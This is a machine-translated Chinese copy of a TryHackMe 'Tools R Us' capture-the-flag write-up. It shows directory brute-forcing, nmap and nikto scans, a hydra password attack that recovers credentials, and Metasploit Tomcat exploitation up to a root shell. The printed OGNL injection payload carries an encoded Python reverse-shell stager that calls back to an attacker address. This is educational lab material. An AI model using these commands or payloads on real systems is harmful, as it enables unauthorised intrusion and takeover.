<html>
<head>
<title>TryHackMe writeup: Tools R Us</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe文章:工具为我们</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-tools-r-us-daf0934f32f2?source=collection_archive---------2-----------------------#2022-10-13">https://infosecwriteups.com/tryhackme-writeup-tools-r-us-daf0934f32f2?source=collection_archive---------2-----------------------#2022-10-13</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="723c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">tools RUS(<a class="ae kp" href="https://tryhackme.com/room/toolsrus" rel="noopener ugc nofollow" target="_blank">“tryhackme”，2019 </a>)是一个有趣的小TryHackMe房间，它的用户“使用dirbuster、hydra、nmap、nikto和metasploit等工具进行练习。”在这个房间里，我确实学到了一些有趣的东西，但主要的教训是永远不要低估可以从开源情报和端口扫描中获得的信息。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/587532eea67e3e498c6671840c1443f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2A8pzy_YD1bJzoDJ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">基础图片:<a class="ae kp" href="https://www.imdb.com/title/tt4525470/" rel="noopener ugc nofollow" target="_blank">某科学轨道炮(2009) </a></figcaption></figure><h1 id="b575" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">程序</h1><p id="313d" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">在我继续之前，我必须确定这个房间的目标。创建这个房间是为了让用户可以针对目标系统练习不同的黑客工具。它要求提供关于目标系统的不同信息，以及<code class="fe mj mk ml mm b">root</code>用户的标志。因此，我将“跟随”这个房间中给出的提示，直到我找到根标志。</p><p id="7596" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将通过修改<code class="fe mj mk ml mm b">/etc/hosts</code>文件来包含<code class="fe mj mk ml mm b">toolsrus.thm</code>伪域来做一些“内务处理”,该伪域将指向目标机器不断变化的动态IP地址。点击第一个任务右上角的绿色“启动机器”后，我就可以开始了！</p><h2 id="5e68" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">探索</h2><p id="3347" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">我先从使用DirBuster工具(<a class="ae kp" href="https://www.kali.org/tools/dirbuster/" rel="noopener ugc nofollow" target="_blank">“Kali Linux Tools”，n.d. </a>)用字典攻击方法枚举子目录开始。图1显示了DirBuster的用户界面及其许多设置。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj mz"><img src="../Images/f8a14ccdc8b1a5a9ee2f4f56f00ebf86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1XGAoGWZsrvT8ZQj.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图1 </strong></figcaption></figure><p id="bf7b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将从设置目标url(图1a)开始，然后将线程数设置为100(图1b)以加快进程，并选择一个好的潜在子目录字典。最后，我点击了“开始”,很明显，这就开始了这个过程。</p><p id="8394" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">大约一个小时后，列表返回如图2所示的目录结构:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj na"><img src="../Images/3a0501d952007924d40930c3689158c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*uFMl2_TwHQzZKHpv.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图2 </strong></figcaption></figure><p id="19e4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">目录结构揭示了一些有趣的子目录:一个带有200响应代码的<code class="fe mj mk ml mm b">/guidelines</code>文件夹，一个带有401响应代码的<code class="fe mj mk ml mm b">/protected</code>文件夹和一个带有403响应代码的<code class="fe mj mk ml mm b">/server-status</code>文件夹——它们分别代表“正常”、“未授权”和“禁止”(<a class="ae kp" href="https://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml" rel="noopener ugc nofollow" target="_blank">互联网号码分配机构，n.d. </a>)。访问<code class="fe mj mk ml mm b">/guidelines</code>子目录时，我得到以下消息:</p><blockquote class="nb nc nd"><p id="fc75" class="jr js ne jt b ju jv jw jx jy jz ka kb nf kd ke kf ng kh ki kj nh kl km kn ko in bi translated"><em class="iu">“嘿</em> <strong class="jt iv"> <em class="iu"> bob </em> </strong> <em class="iu">，你更新那个TomCat服务器了吗？”</em></p></blockquote><p id="bb5b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我可以从这条消息中推断出两件事:系统上可能有一个名为“bob”的用户，目标系统上可能有一个TomCat服务器(<a class="ae kp" href="https://tomcat.apache.org/" rel="noopener ugc nofollow" target="_blank"> Apache Software Foundation，n.d. </a>)正在运行。为了验证后者，我通过运行以下命令启动了对目标系统的nmap (n.d .)扫描:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="1d41" class="mn lh iu mm b gz nm nn l no np">└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml toolsrus.thm</span></pre><p id="6d06" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">扫描完成后，我使用<code class="fe mj mk ml mm b">xsltproc</code>命令将XML输出转换成可读性更好的HTML文档。它的渲染如图3所示:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nq"><img src="../Images/ab66038db294db7f3880f129deb566a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2cAQ5JGLnz_s_fJw.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图3 </strong></figcaption></figure><p id="e6a3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">如果图上的文字难以阅读，我很抱歉，但它确实揭示了目标系统上有趣的服务:</p><ul class=""><li id="8b7d" class="nr ns iu jt b ju jv jy jz kc nt kg nu kk nv ko nw nx ny nz bi translated">端口22上的OpenSSH服务。</li><li id="f7d7" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">端口80上的Apache web服务(2.4.18版)。</li><li id="3fe0" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">端口1234上的Apache Tomcat服务(7.0.88版)。</li><li id="72a4" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">端口8009上的Apache Jserv服务(1.1版)。</li></ul><p id="b52d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">目标系统似乎运行的是Ubuntu(T21)，或者至少是其他的Linux变种。这证实了子目录<code class="fe mj mk ml mm b">/guidelines</code>中注释的后半部分，这表明假设有一个名为“bob”的用户用于向其中一个服务进行身份验证更可信。</p><p id="3575" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">房间指出“鲍勃”是<code class="fe mj mk ml mm b">/protected</code>子目录的用户名。为了计算出“bob”的密码，我使用了hydra(<a class="ae kp" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">“van Hauser”，n.d. </a>)密码破解程序来列举用户名<code class="fe mj mk ml mm b">bob</code>的不同类型的密码:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="867d" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">└─$ hydra -l bob -P ~/toolsrus/rockyou.txt -s 80 -f toolsrus.thm http-get /protected -V</strong></span></pre><p id="3c1a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">几秒钟后会产生以下输出:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="d1b0" class="mn lh iu mm b gz nm nn l no np">[... snip ...]</span><span id="6e9c" class="mn lh iu mm b gz of nn l no np">[ATTEMPT] target toolsrus.thm - login "bob" - pass "elizabeth" - 61 of 14344399 [child 12] (0/0)<br/>[ATTEMPT] target toolsrus.thm - login "bob" - pass "hottie" - 62 of 14344399 [child 13] (0/0)<br/>[80][http-get] host: toolsrus.thm   login: bob   password: bubbles<br/>[STATUS] attack finished for toolsrus.thm (valid pair found)</span><span id="16e9" class="mn lh iu mm b gz of nn l no np">[... snip ...]</span></pre><p id="75d8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">使用用户名和密码组合<code class="fe mj mk ml mm b">bob</code> : <code class="fe mj mk ml mm b">bubbles</code>，我现在可以登录到“受保护”的页面。图4描述了“受保护”的页面:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj og"><img src="../Images/3b92eb47700b0958e31aead48cc21327.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/0*De16JJzuKL5ftiIt.png"/></div></figure><p id="e66a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这似乎没有提供多少有用的信息。但是尽管如此，我还是发现了一个用户名和密码组合<code class="fe mj mk ml mm b">bob</code> : <code class="fe mj mk ml mm b">bubbles</code>，可以用来填充凭证(<a class="ae kp" href="https://doi.org/10.1109/csci54926.2021.00187" rel="noopener ugc nofollow" target="_blank"> Nguyen等人，2022 </a>)。</p><p id="99ff" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了获得可能更有用的信息，我使用了<a class="ae kp" href="https://cirt.net/Nikto2" rel="noopener ugc nofollow" target="_blank"> nikto (n.d.) </a>工具来进一步探测运行在1234端口上的Apache Tomcat服务器；我用以下命令启动了扫描:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="f4fc" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">└─$ nikto -nossl -port 1234 -host toolsrus.thm -id bob:bubbles -output index.htm -Format htm</strong></span></pre><p id="ffc5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在又一个小时左右的探查之后，<em class="ne"> nikto </em>揭示了一些半有趣的东西，如其终端输出所示:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="e524" class="mn lh iu mm b gz nm nn l no np">[... snip ...]<br/><br/>+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...<br/>+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.<br/>+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.<br/>+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.<br/>+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.<br/>+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.<br/><br/>[... snip ...]</span></pre><p id="19ba" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Nikto找到了大约五(5)个关于Apache Tomcat实例文档的网页。</p><h2 id="84e9" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">初始访问</h2><p id="9ada" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated"><a class="ae kp" href="https://metasploit.com/" rel="noopener ugc nofollow" target="_blank"> Metasploit(未注明)</a>附带了一个利用Apache Tomcat v. 7.0.88中的漏洞的模块(<a class="ae kp" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/struts2_namespace_ognl" rel="noopener ugc nofollow" target="_blank"> Mo等人，</a>)。我试图配置并启动漏洞，但遇到了一些错误:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="ebe2" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">└─$ sudo msfconsole </strong><br/>                                                  <br/>[... snip ...]</span><span id="8aac" class="mn lh iu mm b gz of nn l no np"><strong class="mm iv">msf6 &gt; search tomcat 7.0.88</strong></span><span id="1a4a" class="mn lh iu mm b gz of nn l no np">[... snip ...] 0  exploit/multi/http/struts2_namespace_ognl  2018-08-22 [... snip ...]</span><span id="f744" class="mn lh iu mm b gz of nn l no np"><strong class="mm iv">msf6 &gt; use exploit/multi/http/struts2_namespace_ognl</strong><br/>[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp<br/><strong class="mm iv">msf6 exploit(multi/http/struts2_namespace_ognl) &gt; set RHOSTS toolsrus.thm</strong><br/>RHOSTS =&gt; toolsrus.thm<br/><strong class="mm iv">msf6 exploit(multi/http/struts2_namespace_ognl) &gt; set RPORT 1234</strong><br/>LPORT =&gt; 1234<br/><strong class="mm iv">msf6 exploit(multi/http/struts2_namespace_ognl) &gt; set LHOST attacker.thm</strong><br/>LPORT =&gt; attacker.thm<br/><strong class="mm iv">msf6 exploit(multi/http/struts2_namespace_ognl) &gt; exploit</strong></span><span id="ec1e" class="mn lh iu mm b gz of nn l no np">[*] Started reverse TCP handler on attacker.thm:4444 <br/>[-] Bad OGNL request: ${(#_memberAccess['allowStaticMethodAccess']=true).(#p=new java.lang.ProcessBuilder({'sh','-c','echo exec\(__import__\(\'base64\'\).b64decode\(__import__\(\'codecs\'\).getencoder\(\'utf-8\'\)\(\'aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjkuNi4xMzUnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo\=\'\)\[0\]\)\) | exec $(which python || which python3 || which python2) -'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r)).(#r.flush())}<br/>[-] Exploit aborted due to failure: bad-config: OGNL request cannot contain a '\'<br/>[*] Exploit completed, but no session was created.</span></pre><p id="6e41" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我在搜索引擎上查找了“Metasploit Bad request”，并找到了前面提到的<a class="ae kp" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/struts2_namespace_ognl" rel="noopener ugc nofollow" target="_blank"> Mo et al. (n.d.) </a>关于该漏洞的文档。文档讨论了导致故障的代码片段:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="7e3b" class="mn lh iu mm b gz nm nn l no np"># Snippet adapted from Mo et al. (n.d.)</span><span id="18a4" class="mn lh iu mm b gz of nn l no np">149:	    #   '\n' ends the GET request prematurely<br/>150:	<br/>151:	    bad_chars = %w[; \\ \r \n]    # and maybe '/'<br/>152:	    bad_chars.each do |c|<br/>153:	      if ognl.include? c<br/>154:	        print_error("Bad OGNL request: #{ognl}")<br/>155:	        fail_with(Failure::BadConfig, "OGNL request cannot contain a '#{c}'")<br/>156:	      end<br/>157:	    end<br/>158:	<br/>159:	    # The following list of characters *must* be encoded or ORNL will asplode</span></pre><p id="d7d2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">好吧。看起来角色<code class="fe mj mk ml mm b">;</code>、<code class="fe mj mk ml mm b">\\</code>、<code class="fe mj mk ml mm b">\r</code>、<code class="fe mj mk ml mm b">\n</code>和<code class="fe mj mk ml mm b">/</code>必须使用某种编码才能让漏洞发挥作用。我尝试了一下模块的高级设置——比如将<code class="fe mj mk ml mm b">EnableStageEncoding</code>和<code class="fe mj mk ml mm b">EnableContextEncoding</code>都设置为<code class="fe mj mk ml mm b">true</code>。我甚至编辑了<code class="fe mj mk ml mm b">struts2_namespace_ognl.rb</code>模块，并删除了“坏字符”列表中的<code class="fe mj mk ml mm b">\</code>字符，但即使是这种尝试也以同样的“广告OGNL请求”告终</p><p id="ba83" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我最终放弃了使用<code class="fe mj mk ml mm b">struts2_namespace_ognl</code>模块，做了更多的研究，并尝试使用一个不同的利用模块，该模块使用了前面提到的凭证填充技术——这是由<a class="ae kp" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/tomcat_mgr_upload" rel="noopener ugc nofollow" target="_blank">“ranger cha”，(未标明)</a>设计的<code class="fe mj mk ml mm b">tomcat_mgr_upload</code>。</p><p id="55eb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我配置并运行了漏洞，然后…</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="1627" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">└─$ sudo msfconsole</strong></span><span id="34a3" class="mn lh iu mm b gz of nn l no np">[... snip ...]</span><span id="b0ec" class="mn lh iu mm b gz of nn l no np"><strong class="mm iv">msf6 &gt; use exploit/multi/http/tomcat_mgr_upload</strong><br/>[*] No payload configured, defaulting to java/meterpreter/reverse_tcp<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername bob</strong><br/>HttpUsername =&gt; bob<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword bubbles</strong><br/>HttpPassword =&gt; bubbles<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOSTS toolsrus.thm</strong><br/>RHOSTS =&gt; toolsrus.thm<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 1234</strong><br/>RPORT =&gt; 1234<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set LHOST attacker.thm</strong><br/>LHOST =&gt; attacker.thm<br/><strong class="mm iv">msf6 exploit(multi/http/tomcat_mgr_upload) &gt; exploit</strong></span><span id="60ed" class="mn lh iu mm b gz of nn l no np">[*] Started reverse TCP handler on attacker.thm:4444 <br/>[*] Retrieving session ID and CSRF token...<br/>[*] Uploading and deploying RAZHrqS5YFYauJLnwJaEDZOJv7Q3M9...<br/>[*] Executing RAZHrqS5YFYauJLnwJaEDZOJv7Q3M9...<br/>[*] Sending stage (58829 bytes) to toolsrus.thm<br/>[*] Undeploying RAZHrqS5YFYauJLnwJaEDZOJv7Q3M9 ...<br/>[*] Undeployed at /manager/html/undeploy<br/>[*] Meterpreter session 1 opened (attacker.thm:4444 -&gt; toolsrus.thm:42424 ) at [redacted] -0400</span><span id="e6d5" class="mn lh iu mm b gz of nn l no np"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="e196" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">非常好。</p><h1 id="0914" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">后剥削</h1><p id="bb94" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">我进入一个Linux终端，用<code class="fe mj mk ml mm b">id</code>命令获得当前用户:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="fde9" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">meterpreter &gt; shell</strong></span><span id="e4c3" class="mn lh iu mm b gz of nn l no np">Process 1 created.<br/>Channel 1 created.<br/><strong class="mm iv">$ id</strong><br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="40b5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">不需要权限提升，我可以直接转储根标志:</p><pre class="kr ks kt ku gu ni mm nj nk aw nl bi"><span id="09ee" class="mn lh iu mm b gz nm nn l no np"><strong class="mm iv">$ cat /root/flag.txt</strong><br/>[redacted]</span></pre><p id="e74a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="ee1d" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">摘要</h1><p id="1afb" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">尽管这是一个“容易”的房间，但仍然很容易犯愚蠢的错误，现实生活中的攻击性安全工程项目可能会将一个人置于那些明显“隐藏在众目睽睽之下”的情况下</p><h2 id="60a2" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">外卖食品</h2><ul class=""><li id="5e79" class="nr ns iu jt b ju me jy mf kc oh kg oi kk oj ko nw nx ny nz bi translated"><code class="fe mj mk ml mm b">tomcat_mgr_upload</code> Metasploit模块可用于接管Apache Tomcat实例——假设攻击者拥有系统的用户名和密码。</li><li id="a63d" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">像<em class="ne"> DirBuster </em>、<em class="ne"> nmap </em>和<em class="ne"> nikto </em>这样的探测工具可以揭示一些很酷的东西。</li><li id="549e" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">不要低估字典攻击的威力和系统上的那些小信息。</li></ul><h2 id="2263" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">插头</h2><p id="df94" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">向这些人捐款，因为他们需要经济帮助:</p><ul class=""><li id="b6e1" class="nr ns iu jt b ju jv jy jz kc nt kg nu kk nv ko nw nx ny nz bi translated">现金伊西。app:<a class="ae kp" href="https://cash.app/$izzykilla" rel="noopener ugc nofollow" target="_blank">https://cash.app/$izzykilla</a></li><li id="0508" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">迪. w .现金交易。app:<a class="ae kp" href="https://cash.app/$pitfirego" rel="noopener ugc nofollow" target="_blank">https://cash.app/$pitfirego</a></li><li id="7575" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">https://account.venmo.com/u/Spitfirego</li><li id="49cf" class="nr ns iu jt b ju oa jy ob kc oc kg od kk oe ko nw nx ny nz bi translated">郭台铭谈现金。app:<a class="ae kp" href="https://cash.app/$octgayvian" rel="noopener ugc nofollow" target="_blank">https://cash.app/$octgayvian</a></li></ul><p id="87b3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">作者注</strong>:此文最初自发表于<em class="ne">Substack</em>:<a class="ae kp" href="https://epsiloncalculus.substack.com/p/tryhackme-writeup-tools-r-us" rel="noopener ugc nofollow" target="_blank">https://epsilon calculus . Substack . com/p/tryhackme-writeup-tools-r-us</a></p><h1 id="eb6b" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">参考</h1><p id="4a40" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">某科学轨道炮，2009年J.C .职员冬川摩托伊创造。</p><p id="aebb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿帕奇软件基金会(未注明)。<em class="ne">阿帕奇雄猫</em>。2022年8月8日检索:<a class="ae kp" href="https://tomcat.apache.org/" rel="noopener ugc nofollow" target="_blank">https://tomcat.apache.org/</a></p><p id="49d0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">互联网号码分配机构。<em class="ne">超文本传输协议(HTTP)状态码注册表</em>。2022年8月7日检索自:<a class="ae kp" href="https://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml" rel="noopener ugc nofollow" target="_blank">https://www . iana . org/assignments/http-status-codes/http-status-codes . XHTML</a></p><p id="c19c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“Kali Linux工具”(未注明)。<em class="ne">恐怖克星</em>。2022年8月7日检索自:<a class="ae kp" href="https://www.kali.org/tools/dirbuster/" rel="noopener ugc nofollow" target="_blank">https://www.kali.org/tools/dirbuster/</a></p><p id="5958" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit(未注明)。<em class="ne">渗透测试软件和笔测试安全</em>。2022年8月8日检索自:<a class="ae kp" href="https://metasploit.com/" rel="noopener ugc nofollow" target="_blank">https://metasploit.com/</a></p><p id="0fde" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">莫，M. Y，“hook-s3c”，“asoto-r7”和“wvu”(未注明)。<em class="ne"> Apache Struts 2名称空间重定向OGNL注入— Metasploit </em>。信息安全问题。2022年8月8日检索自:<a class="ae kp" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/struts2_namespace_ognl" rel="noopener ugc nofollow" target="_blank">https://www.infosecmatter.com/metasploit-module-library/?mm = exploit/multi/http/struts 2 _ namespace _ ognl</a></p><p id="1d85" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Nguyen Ba，M. H .、Bennett，j .、加拉格尔和布尼亚，S. (2021)。凭证填充攻击案例研究:Canva数据泄露。<em class="ne">2021年计算科学与计算智能国际会议(CSCI) </em>。IEEE。https://doi.org/10.1109/csci54926.2021.00187<a class="ae kp" href="https://doi.org/10.1109/csci54926.2021.00187" rel="noopener ugc nofollow" target="_blank"/></p><p id="8228" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">尼克托(未标明)。2022年8月8日检索自:【https://cirt.net/Nikto2 T4】</p><p id="0334" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。<em class="ne">网络映射器——免费安全扫描器</em>。2022年8月8日检索自:<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="c23c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“兰格尔查”(未注明)。Apache Tomcat管理器验证上传代码执行— Metasploit。信息安全问题。2022年8月8日检索自:<a class="ae kp" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/tomcat_mgr_upload" rel="noopener ugc nofollow" target="_blank">https://www.infosecmatter.com/metasploit-module-library/?mm = exploit/multi/http/Tomcat _ mgr _ upload</a></p><p id="2a88" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。<em class="ne"> ToolsRus:练习使用dirbuster、hydra、nmap、nikto、metasploit </em>等工具。TryHackMe。2022年8月7日检索自:<a class="ae kp" href="https://tryhackme.com/room/toolsrus" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/toolsrus</a></p><p id="45b6" class="pw-post-body-paragraph jr js iu jt b ju 